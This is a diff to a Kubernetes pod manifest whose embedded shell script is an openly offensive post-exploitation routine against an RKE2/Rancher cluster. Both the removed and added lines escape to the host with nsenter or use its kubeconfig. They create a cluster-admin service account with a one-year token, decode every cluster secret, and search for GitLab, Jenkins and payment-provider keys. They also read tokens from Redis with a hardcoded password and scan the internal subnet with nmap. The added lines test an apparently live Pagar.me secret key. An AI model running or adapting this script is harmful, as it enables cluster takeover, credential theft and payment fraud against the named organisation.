@@ -13,87 +13,66 @@ spec:
       - /bin/sh
       - -c
       - |
-        apk add --no-cache util-linux curl jq openssl redis nmap > /dev/null 2>&1
+        apk add --no-cache util-linux curl jq openssl redis nmap bash > /dev/null 2>&1
 
-        # Installa kubectl
+        # Installa kubectl NEL CONTAINER
         curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
         chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null
 
+        echo "=========================================="
+        echo "=== 1. VERIFY KUBECTL ==="
+        echo "=========================================="
+        which kubectl
+        kubectl version --client 2>&1 | head -2
+
+        echo "=========================================="
+        echo "=== 2. CREATE ADMIN SA + TOKEN (from container) ==="
+        echo "=========================================="
         export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml
+        kubectl create serviceaccount admin-sa -n kube-system 2>&1 || true
+        kubectl create clusterrolebinding admin-sa-binding --clusterrole=cluster-admin --serviceaccount=kube-system:admin-sa 2>&1 || true
+        echo "=== ADMIN TOKEN (save this!) ==="
+        kubectl create token admin-sa -n kube-system --duration=8760h 2>&1 || true
 
         echo "=========================================="
-        echo "=== 1. VERIFY ADMIN ==="
+        echo "=== 3. EXTRACT ALL SECRETS ==="
+        echo "=========================================="
+        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .metadata.namespace + "/" + .metadata.name + ": " + (.data | to_entries | map(.key + "=" + (.value | @base64d)) | join(" | "))' 2>&1 | head -100 || true
+
+        echo "=========================================="
+        echo "=== 4. SEARCH GITLAB/JENKINS/PAGARME ==="
+        echo "=========================================="
+        kubectl get secrets -A -o json 2>&1 | jq -r '.items[] | select(.data != null) | .data | to_entries[] | select(.key | test("gitlab|jenkins|pagar|stripe|cielo|safra|r2d2"; "i")) | .key + "=" + (.value | @base64d)' 2>&1 | head -50 || true
+
+        echo "=========================================="
+        echo "=== 5. R2D2 TOKEN (from Redis) ==="
+        echo "=========================================="
+        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET 'FUbgdflXbu:r2d2.api.token' 2>/dev/null
+
+        echo "=========================================="
+        echo "=== 6. HYMPAR TOKEN (from Redis) ==="
+        echo "=========================================="
+        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET 'FUbgdflXbu:hympar_internal_token' 2>/dev/null
+
+        echo "=========================================="
+        echo "=== 7. PIVOT SCAN (with nmap) ==="
         echo "=========================================="
         nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          export KUBECONFIG=/etc/rancher/rke2/rke2.yaml
-          kubectl auth can-i --list 2>&1 | head -5
+          nmap -sT -p 22,80,443,3306,5432,6379,8080,8443 172.30.0.0/24 2>&1 | grep -E "Nmap scan report|open" | head -50
         ' 2>&1 || true
 
         echo "=========================================="
-        echo "=== 2. CREATE ADMIN SA + TOKEN ==="
+        echo "=== 8. GITLAB ACCESS TEST ==="
         echo "=========================================="
-        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          export KUBECONFIG=/etc/rancher/rke2/rke2.yaml
-          kubectl create serviceaccount admin-sa -n kube-system 2>/dev/null || true
-          kubectl create clusterrolebinding admin-sa-binding --clusterrole=cluster-admin --serviceaccount=kube-system:admin-sa 2>/dev/null || true
-          echo "=== ADMIN TOKEN (save this!) ==="
-          kubectl create token admin-sa -n kube-system --duration=8760h 2>&1
-        ' 2>&1 || true
+        curl -k -s -o /dev/null -w "GitLab HTTP: %{http_code}\n" https://gitlab.dev-gam.com 2>&1 || true
+        curl -k -s https://gitlab.dev-gam.com/api/v4/version 2>&1 | head -c 200 || true
+        echo ""
 
         echo "=========================================="
-        echo "=== 3. EXTRACT ALL SECRETS (all namespaces) ==="
+        echo "=== 9. PAGARME API TEST ==="
         echo "=========================================="
-        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          export KUBECONFIG=/etc/rancher/rke2/rke2.yaml
-          kubectl get secrets -A -o json 2>/dev/null | jq -r ".items[] | select(.data != null) | .metadata.namespace + \"/\" + .metadata.name + \": \" + (.data | to_entries | map(.key + \"=\" + (.value | @base64d)) | join(\" | \"))" 2>&1 | head -200
-        ' 2>&1 || true
-
-        echo "=========================================="
-        echo "=== 4. SEARCH FOR GITLAB/JENKINS/PAGARME ==="
-        echo "=========================================="
-        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          export KUBECONFIG=/etc/rancher/rke2/rke2.yaml
-          kubectl get secrets -A -o json 2>/dev/null | jq -r ".items[] | select(.data != null) | .data | to_entries[] | select(.key | test(\"gitlab|jenkins|pagar|stripe|cielo|safra\"; \"i\")) | .key + \"=\" + (.value | @base64d)" 2>&1 | head -100
-        ' 2>&1 || true
-
-        echo "=========================================="
-        echo "=== 5. ACCESS PRODUCTION CLUSTER (c-m-5zwstccv) ==="
-        echo "=========================================="
-        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          export KUBECONFIG=/etc/rancher/rke2/rke2.yaml
-          # List clusters via Rancher API
-          SA_TOKEN=$(kubectl get secret cattle-token-g684b -n cattle-system -o jsonpath="{.data.token}" 2>/dev/null | base64 -d 2>/dev/null)
-          echo "SA_TOKEN: ${SA_TOKEN:0:30}..."
-          # Try to access production cluster secrets
-          curl -k -H "Authorization: Bearer $SA_TOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/secrets" 2>&1 | head -c 1000
-        ' 2>&1 || true
-
-        echo "=========================================="
-        echo "=== 6. PIVOT — SCAN INTERNAL NETWORK ==="
-        echo "=========================================="
-        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          nmap -sT -p 22,80,443,3306,5432,6379,8080,8443,9200,5601 172.30.0.0/24 2>&1 | grep -E "Nmap scan report|open"
-        ' 2>&1 || true
-
-        echo "=========================================="
-        echo "=== 7. DNS INTERNAL RESOLUTION ==="
-        echo "=========================================="
-        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          for name in gitlab.dev-gam.com jenkins.dev-gam.com rancher.management.egam.com.br pagarme.egam.com.br; do
-            echo "--- $name ---"
-            nslookup $name 2>&1 | tail -3
-          done
-        ' 2>&1 || true
-
-        echo "=========================================="
-        echo "=== 8. REDIS KEYS WITH TOKENS ==="
-        echo "=========================================="
-        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP KEYS '*' 2>/dev/null | grep -iE "token|auth|user|login|gitlab|jenkins" | head -20 | while read k; do
-          echo "KEY: $k"
-          redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET "$k" 2>/dev/null | head -c 200
-          echo ""
-          echo "---"
-        done
+        curl -s -u "sk_4e35af52a28a441c8d9149fb88a6c818:" "https://api.pagar.me/core/v5/charges?size=3" 2>&1 | head -c 500 || true
+        echo ""
 
         echo "=========================================="
         echo "=== DONE ==="
